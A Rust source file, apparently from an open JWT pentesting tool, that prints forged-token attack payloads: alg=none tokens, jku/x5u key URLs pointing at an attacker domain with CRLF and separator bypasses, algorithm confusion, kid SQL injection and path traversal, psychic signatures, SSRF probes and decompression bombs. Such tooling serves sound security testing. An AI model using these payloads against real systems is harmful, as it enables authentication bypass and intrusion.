use anyhow::Result;
use base64::{engine::general_purpose, Engine as _};
use log::info;
use serde_json::json;
use serde_json::Value;
use std::collections::HashSet;

use crate::jwt;
use crate::printing::theme;
use crate::utils;

/// Generates different JWT attack payloads based on the given token and parameters
pub fn execute(
    token: &str,
    jwk_trust: Option<&str>,
    jwk_attack: Option<&str>,
    jwk_protocol: &str,
    target: Option<&str>,
) {
    if let Err(e) = generate_payloads(token, jwk_trust, jwk_attack, jwk_protocol, target) {
        utils::log_error(format!("Error generating payloads: {e}"));
        utils::log_error("e.g jwt-hack payload {JWT_CODE} --jwk-attack attack.example.com --jwk-trust trust.example.com --target none,jku,alg_confusion");
    }
}

pub fn execute_json(
    token: &str,
    jwk_trust: Option<&str>,
    jwk_attack: Option<&str>,
    jwk_protocol: &str,
    target: Option<&str>,
) -> Result<Value> {
    let payloads =
        crate::payload::generate_all_payloads(token, jwk_trust, jwk_attack, jwk_protocol, target)?;
    Ok(serde_json::json!({
        "success": true,
        "count": payloads.len(),
        "payloads": payloads
    }))
}

fn generate_payloads(
    token: &str,
    jwk_trust: Option<&str>,
    jwk_attack: Option<&str>,
    jwk_protocol: &str,
    target: Option<&str>,
) -> Result<()> {
    // Decode JWT token to validate format
    let _ = jwt::decode(token)?;

    // Extract claims part from token
    let token_parts: Vec<&str> = token.split('.').collect();
    if token_parts.len() < 2 {
        return Err(anyhow::anyhow!("Invalid JWT token format"));
    }

    let claims_part = token_parts[1];

    // Parse comma-separated target types into a HashSet
    let targets: HashSet<String> = match target {
        Some(t) => t.split(',').map(|s| s.trim().to_lowercase()).collect(),
        None => HashSet::from(["all".to_string()]),
    };

    // Define list of supported attack target types
    let valid_targets = [
        "all",
        "none",
        "jku",
        "x5u",
        "alg_confusion",
        "kid_sql",
        "kid_traversal",
        "kid_predictable",
        "x5c",
        "x5c_signed",
        "cty",
        "jwk_embed",
        "jwk_embed_ec",
        "crit",
        "b64",
        "empty_sig",
        "psychic",
        "typ_confusion",
        "alg_edge",
        "ssrf",
        "zip",
        "dup_key",
        "nested",
        "jws_json",
        "alg_family_swap",
        "none_sig",
        "header_quirks",
        "kid_wildcard",
    ];
    for t in &targets {
        if !valid_targets.contains(&t.as_str()) && t != "all" {
            utils::log_warning(format!(
                "Unknown target type: '{}'. Valid types are: {}",
                t,
                valid_targets.join(", ")
            ));
        }
    }

    let should_generate_all = targets.contains("all");

    // Generate 'none' algorithm attack payloads
    if should_generate_all || targets.contains("none") {
        generate_none_payloads(claims_part, "none")?;
        generate_none_payloads(claims_part, "NonE")?;
        generate_none_payloads(claims_part, "NONE")?;
    }

    // Generate URL-based attack payloads (jku/x5u) if attack domain is provided
    if let Some(attack_domain) = jwk_attack {
        if should_generate_all || targets.contains("jku") || targets.contains("x5u") {
            generate_url_payloads(
                token,
                jwk_trust,
                attack_domain,
                jwk_protocol,
                &targets,
                should_generate_all,
            )?;
        }
    } else if should_generate_all || targets.contains("jku") || targets.contains("x5u") {
        utils::log_warning("No attack domain provided. Skipping URL-based payloads.");
    }

    // Generate algorithm confusion attack payloads (RS256->HS256)
    if should_generate_all || targets.contains("alg_confusion") {
        if let Ok(payloads) = crate::payload::generate_alg_confusion_payload(token, None) {
            for payload in payloads {
                println!(
                    "\n{}",
                    theme::subsection_line("Algorithm Confusion (RS256->HS256)")
                );
                println!("  {payload}");
            }
        }
    }

    // Generate key ID (kid) SQL injection attack payloads
    if should_generate_all || targets.contains("kid_sql") {
        if let Ok(payloads) = crate::payload::generate_kid_sql_payload(token) {
            for payload in payloads {
                println!("\n{}", theme::subsection_line("kid SQL Injection"));
                println!("  {payload}");
            }
        }
    }

    // Generate x5c certificate header injection attack payloads
    if should_generate_all || targets.contains("x5c") {
        if let Ok(payloads) = crate::payload::generate_x5c_payload(token) {
            for payload in payloads {
                println!("\n{}", theme::subsection_line("x5c Header Injection"));
                println!("  {payload}");
            }
        }
    }

    // Generate content type (cty) header manipulation attack payloads
    if should_generate_all || targets.contains("cty") {
        if let Ok(payloads) = crate::payload::generate_cty_payload(token) {
            for payload in payloads {
                println!("\n{}", theme::subsection_line("cty Header Manipulation"));
                println!("  {payload}");
            }
        }
    }

    // Generate embedded-JWK header attack payload (real signed token)
    if should_generate_all || targets.contains("jwk_embed") {
        match crate::payload::generate_jwk_embed_payload(token) {
            Ok(payload) => {
                println!(
                    "\n{}",
                    theme::subsection_line("jwk Embedded Header (signed)")
                );
                println!("  {payload}");
            }
            Err(e) => {
                utils::log_warning(format!("Failed to generate jwk_embed payload: {e}"));
            }
        }
    }

    // Generate kid path-traversal payloads
    if should_generate_all || targets.contains("kid_traversal") {
        if let Ok(payloads) = crate::payload::generate_kid_traversal_payload(token) {
            for payload in payloads {
                println!("\n{}", theme::subsection_line("kid Path Traversal"));
                println!("  {payload}");
            }
        }
    }

    // Generate crit header bypass payloads
    if should_generate_all || targets.contains("crit") {
        if let Ok(payloads) = crate::payload::generate_crit_payload(token) {
            for payload in payloads {
                println!("\n{}", theme::subsection_line("crit Header Bypass"));
                println!("  {payload}");
            }
        }
    }

    // Generate RFC 7797 b64=false payloads
    if should_generate_all || targets.contains("b64") {
        if let Ok(payloads) = crate::payload::generate_b64_payload(token) {
            for payload in payloads {
                println!("\n{}", theme::subsection_line("b64=false (RFC 7797)"));
                println!("  {payload}");
            }
        }
    }

    // Generate signature-stripped payloads
    if should_generate_all || targets.contains("empty_sig") {
        if let Ok(payloads) = crate::payload::generate_empty_sig_payload(token) {
            for payload in payloads {
                println!("\n{}", theme::subsection_line("Empty/Stripped Signature"));
                println!("  {payload}");
            }
        }
    }

    // Generate self-signed x5c (real signed token)
    if should_generate_all || targets.contains("x5c_signed") {
        match crate::payload::generate_x5c_signed_payload(token) {
            Ok(payload) => {
                println!(
                    "\n{}",
                    theme::subsection_line("x5c Self-signed Cert (signed)")
                );
                println!("  {payload}");
            }
            Err(e) => {
                utils::log_warning(format!("Failed to generate x5c_signed payload: {e}"));
            }
        }
    }

    // Generate ECDSA psychic signatures (CVE-2022-21449)
    if should_generate_all || targets.contains("psychic") {
        if let Ok(payloads) = crate::payload::generate_psychic_signature_payload(token) {
            for payload in payloads {
                println!(
                    "\n{}",
                    theme::subsection_line("ECDSA Psychic Signature (CVE-2022-21449)")
                );
                println!("  {payload}");
            }
        }
    }

    // Generate typ confusion payloads
    if should_generate_all || targets.contains("typ_confusion") {
        if let Ok(payloads) = crate::payload::generate_typ_confusion_payload(token) {
            for payload in payloads {
                println!("\n{}", theme::subsection_line("typ Confusion"));
                println!("  {payload}");
            }
        }
    }

    // Generate alg edge-value payloads
    if should_generate_all || targets.contains("alg_edge") {
        if let Ok(payloads) = crate::payload::generate_alg_edge_payload(token) {
            for payload in payloads {
                println!("\n{}", theme::subsection_line("alg Edge Value"));
                println!("  {payload}");
            }
        }
    }

    // Generate jku/x5u SSRF probes
    if should_generate_all || targets.contains("ssrf") {
        if let Ok(payloads) = crate::payload::generate_jku_x5u_ssrf_payload(token) {
            for payload in payloads {
                println!("\n{}", theme::subsection_line("jku/x5u SSRF Probe"));
                println!("  {payload}");
            }
        }
    }

    // Generate zip variant + bomb payloads
    if should_generate_all || targets.contains("zip") {
        if let Ok(payloads) = crate::payload::generate_zip_payload(token) {
            for payload in payloads {
                println!(
                    "\n{}",
                    theme::subsection_line("zip Variant / Decompression Bomb")
                );
                println!("  {payload}");
            }
        }
    }

    // Generate kid predictable-path payloads
    if should_generate_all || targets.contains("kid_predictable") {
        if let Ok(payloads) = crate::payload::generate_kid_predictable_payload(token, None) {
            for payload in payloads {
                println!("\n{}", theme::subsection_line("kid Predictable Path"));
                println!("  {payload}");
            }
        }
    }

    // Duplicate-JSON-key header payloads
    if should_generate_all || targets.contains("dup_key") {
        if let Ok(payloads) = crate::payload::generate_duplicate_key_payload(token) {
            for payload in payloads {
                println!(
                    "\n{}",
                    theme::subsection_line("Duplicate JSON Key (alg/typ/kid)")
                );
                println!("  {payload}");
            }
        }
    }

    // Nested JWT (cty=JWT) payloads
    if should_generate_all || targets.contains("nested") {
        if let Ok(payloads) = crate::payload::generate_nested_jwt_payload(token) {
            for payload in payloads {
                println!("\n{}", theme::subsection_line("Nested JWT (cty=JWT)"));
                println!("  {payload}");
            }
        }
    }

    // EC variant of jwk-embed (real signed)
    if should_generate_all || targets.contains("jwk_embed_ec") {
        match crate::payload::generate_jwk_embed_ec_payload(token) {
            Ok(payload) => {
                println!(
                    "\n{}",
                    theme::subsection_line("jwk Embedded Header EC (signed ES256)")
                );
                println!("  {payload}");
            }
            Err(e) => {
                utils::log_warning(format!("Failed to generate jwk_embed_ec payload: {e}"));
            }
        }
    }

    // JWS Flattened JSON serialization
    if should_generate_all || targets.contains("jws_json") {
        if let Ok(payloads) = crate::payload::generate_jws_json_payload(token) {
            for payload in payloads {
                println!(
                    "\n{}",
                    theme::subsection_line("JWS Flattened JSON Serialization")
                );
                println!("  {payload}");
            }
        }
    }

    // PS↔RS cross-family alg swaps
    if should_generate_all || targets.contains("alg_family_swap") {
        if let Ok(payloads) = crate::payload::generate_alg_family_swap_payload(token) {
            for payload in payloads {
                println!(
                    "\n{}",
                    theme::subsection_line("alg Cross-family Swap (PS↔RS / ES family)")
                );
                println!("  {payload}");
            }
        }
    }

    // alg=none with non-empty signature
    if should_generate_all || targets.contains("none_sig") {
        if let Ok(payloads) = crate::payload::generate_none_with_sig_payload(token) {
            for payload in payloads {
                println!(
                    "\n{}",
                    theme::subsection_line("alg=none + Non-empty Signature")
                );
                println!("  {payload}");
            }
        }
    }

    // Header parser quirks (BOM / whitespace / trailing junk)
    if should_generate_all || targets.contains("header_quirks") {
        if let Ok(payloads) = crate::payload::generate_header_quirks_payload(token) {
            for payload in payloads {
                println!(
                    "\n{}",
                    theme::subsection_line("Header Quirks (BOM / WS / Trailing Junk)")
                );
                println!("  {payload}");
            }
        }
    }

    // kid empty/null/wildcard fallback
    if should_generate_all || targets.contains("kid_wildcard") {
        if let Ok(payloads) = crate::payload::generate_kid_wildcard_payload(token) {
            for payload in payloads {
                println!(
                    "\n{}",
                    theme::subsection_line("kid Empty/Null/Wildcard Fallback")
                );
                println!("  {payload}");
            }
        }
    }

    Ok(())
}

/// Creates JWT payloads using 'none' algorithm attack variants with specified claims
fn generate_none_payloads(claims: &str, alg_value: &str) -> Result<()> {
    // Create header with 'none' algorithm variant
    let header = json!({
        "alg": alg_value,
        "typ": "JWT"
    });

    let header_json = serde_json::to_string(&header)?;
    info!("Generate {alg_value} payload header=\"{header_json}\" payload={alg_value}");

    // Base64 encode the header for JWT format
    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());

    println!(
        "\n{}",
        theme::subsection_line(&format!("None Algorithm ({alg_value})"))
    );
    println!("  {}.{}", encoded_header, claims);

    Ok(())
}

/// Creates various URL-based attack payloads using JKU/X5U header parameters
fn generate_url_payloads(
    token: &str,
    jwk_trust: Option<&str>,
    jwk_attack: &str,
    jwk_protocol: &str,
    targets: &HashSet<String>,
    should_generate_all: bool,
) -> Result<()> {
    let mut key_types = Vec::new();

    if should_generate_all || targets.contains("jku") {
        key_types.push("jku");
    }

    if should_generate_all || targets.contains("x5u") {
        key_types.push("x5u");
    }

    if key_types.is_empty() {
        return Ok(());
    }

    let payload_labels = [
        "Basic",
        "Z-Separator Bypass",
        "@-Separator Bypass",
        "CRLF Injection",
    ];

    for key_type in key_types {
        let payloads = crate::payload::generate_url_payload(
            token,
            key_type,
            jwk_attack,
            jwk_trust,
            jwk_protocol,
        )?;

        for (i, payload) in payloads.iter().enumerate() {
            let label = payload_labels.get(i).unwrap_or(&"Bypass");
            println!(
                "\n{}",
                theme::subsection_line(&format!("{label} ({key_type})"))
            );
            println!("  {payload}");
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::engine::general_purpose;
    use serde_json::json;

    fn create_test_token() -> String {
        // Create a simple header and payload
        let header = json!({
            "alg": "HS256",
            "typ": "JWT"
        });

        let payload = json!({
            "sub": "1234567890",
            "name": "Test User",
            "iat": 1516239022
        });

        // Encode to base64
        let header_encoded = general_purpose::URL_SAFE_NO_PAD.encode(header.to_string().as_bytes());
        let payload_encoded =
            general_purpose::URL_SAFE_NO_PAD.encode(payload.to_string().as_bytes());

        // Create a simple test token
        format!("{header_encoded}.{payload_encoded}.signature")
    }

    #[test]
    fn test_execute_no_panic() {
        // Create a test token
        let token = create_test_token();

        // Test with minimal parameters
        let result = std::panic::catch_unwind(|| {
            execute(&token, None, None, "https", None);
        });

        assert!(
            result.is_ok(),
            "execute() should not panic with minimal parameters"
        );
    }

    #[test]
    fn test_execute_with_target_parameters() {
        // Create a test token
        let token = create_test_token();

        // Test with specific target
        let result = std::panic::catch_unwind(|| {
            execute(&token, None, None, "https", Some("none"));
        });

        assert!(
            result.is_ok(),
            "execute() should not panic with 'none' target parameter"
        );
    }

    #[test]
    fn test_execute_with_jwk_parameters() {
        // Create a test token
        let token = create_test_token();

        // Test with JWK parameters
        let result = std::panic::catch_unwind(|| {
            execute(
                &token,
                Some("trust.example.com"),
                Some("attack.example.com"),
                "https",
                Some("jku,x5u"),
            );
        });

        assert!(
            result.is_ok(),
            "execute() should not panic with JWK parameters"
        );
    }

    #[test]
    fn test_execute_with_invalid_token() {
        // Create an invalid token
        let token = "invalid.token";

        // Test with invalid token
        let result = std::panic::catch_unwind(|| {
            execute(token, None, None, "https", None);
        });

        assert!(
            result.is_ok(),
            "execute() should not panic with invalid token"
        );
    }

    #[test]
    fn test_generate_none_payloads() {
        // Create a valid payload part
        let payload_str = "eyJzdWIiOiIxMjM0NTY3ODkwIn0";

        // Test generating none payload
        let result = generate_none_payloads(payload_str, "none");

        assert!(result.is_ok(), "generate_none_payloads should not fail");
    }

    #[test]
    fn test_generate_url_payloads() {
        // Create a test token
        let token = create_test_token();

        // Create a set of targets
        let mut targets = HashSet::new();
        targets.insert("jku".to_string());
        targets.insert("x5u".to_string());

        // Test generating url payloads
        let result = generate_url_payloads(
            &token,
            Some("trust.example.com"),
            "attack.example.com",
            "https",
            &targets,
            false,
        );

        assert!(result.is_ok(), "generate_url_payloads should not fail");
    }
}
